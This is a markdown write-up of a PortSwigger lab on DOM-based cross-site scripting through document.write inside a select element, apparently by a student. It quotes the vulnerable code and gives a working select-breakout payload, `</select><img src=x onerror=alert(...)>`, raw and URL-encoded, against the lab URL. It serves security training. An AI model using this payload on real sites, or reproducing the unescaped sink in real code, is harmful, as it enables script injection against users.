<h1 align="center"> Lab: DOM XSS in document.write sink using source location.search inside a select element </h1>



## Lab URL: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element



### Requirements:
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.
To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function. 



# Start Lab:
<img width="1050" height="600" alt="image" src="https://github.com/user-attachments/assets/b362ce82-4ec0-4937-9909-698852c411b2" />

<img width="1031" height="899" alt="image" src="https://github.com/user-attachments/assets/eb91da7b-6e4c-4e39-b914-a2d590678cbb" />


- In this i use it with my `Burp Suite` -> open `Burp browser`:
<img width="1918" height="860" alt="image" src="https://github.com/user-attachments/assets/9a0285e9-c0b4-4967-b1e6-f1de972bf5b2" />


- After input `Target URL` into `Burp Browser`
<img width="1919" height="1078" alt="image" src="https://github.com/user-attachments/assets/8d7a92a2-5f54-450b-a009-894a5caebc2b" />


<img width="1008" height="808" alt="image" src="https://github.com/user-attachments/assets/85adcfe4-3920-4bdf-bed3-421148262b70" />


<img width="1068" height="817" alt="image" src="https://github.com/user-attachments/assets/dc735122-33a1-4a08-9f06-f20dada1ba36" />


- After go back to our `Burp`:
<img width="1916" height="1045" alt="image" src="https://github.com/user-attachments/assets/dbfaa331-33fe-4e9a-9e27-7dad17a7ec38" />

- Now we see our target `Post Request`:




- After go back to our `Borwser` -> Press `F12` or `Right-Click` -> `Inspect` , and view on this:
<img width="1557" height="783" alt="image" src="https://github.com/user-attachments/assets/0d17f754-08d6-4869-91aa-f5a7021957f6" />

- And in this we it it the same:
<img width="1240" height="786" alt="image" src="https://github.com/user-attachments/assets/a67c6c6f-625e-4b00-a8c0-e8acb076bde5" />


- Core Reason:
  - `Source`: window.location.search (the query string in the URL) is a common DOM XSS source—it’s fully controlled by the user.
  - `Sink`: document.write() is a dangerous sink because it parses its input as raw HTML.
  - `Vulnerability`: The app reads storeId from the URL and directly inserts it into the page via document.write() without escaping or sanitizing.

- This creates a classic DOM-based XSS:
User input → inserted into DOM as HTML → browser executes injected script


#### Specific Payload Works
- Consider this payload:
````
storeId=</select><img src=x onerror=alert(1)>
````
- When inserted into the page, the resulting HTML becomes:
````
<select name="storeId">
  <option selected></select><img src=x onerror=alert(1)>></option>
  <option>London</option>
  <option>Paris</option>
  <option>Milan</option>
</select>
````
- But here’s the key: HTML parsers are forgiving. The browser sees:
  - `<select>` opened
  - Immediately closed by your injected `</select>`
  - Then parses `<img src=x onerror=alert(1)>` as normal HTML outside the select
- The <img> tag loads a nonexistent image (src=x), which triggers the onerror handler → alert(1) executes.


- Vulnerable Code Recap:
````
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<option selected>'+store+'</option>');
````

- This directly embeds `storeId` as HTML inside a `<select>` element.






### Solution

- Craft a payload that breaks out of the <select> context, Because <script> tags don’t execute reliably inside <select>, you must close the <select> first, then inject executable HTML:

https://0a77005504522dc3808803430096008e.web-security-academy.net/product?productId=1&storeId=</select><img src=x onerror=alert(document.domain)> 

<img width="1271" height="950" alt="image" src="https://github.com/user-attachments/assets/df16e337-a58a-496f-87e0-d4250f956f31" />


- URL-encode

https://0a77005504522dc3808803430096008e.web-security-academy.net/product?productId=1&storeId=%3C/select%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E


<img width="1212" height="781" alt="image" src="https://github.com/user-attachments/assets/2b68072e-29f6-41ac-9495-97a3c4b351a0" />


<img width="1077" height="821" alt="image" src="https://github.com/user-attachments/assets/ac2d4dbf-ff4f-4e4e-86d1-39ea745d07fe" />


<img width="752" height="748" alt="image" src="https://github.com/user-attachments/assets/7712afe6-00d2-4fe2-98b2-bf9f95ab94be" />

- Now we solved this lab.



---


<h2 align="center"> Finished Lab 10 </h2>


<h2 align="center"> Authore By: Nin Kanong (k4n0ng) </h2>
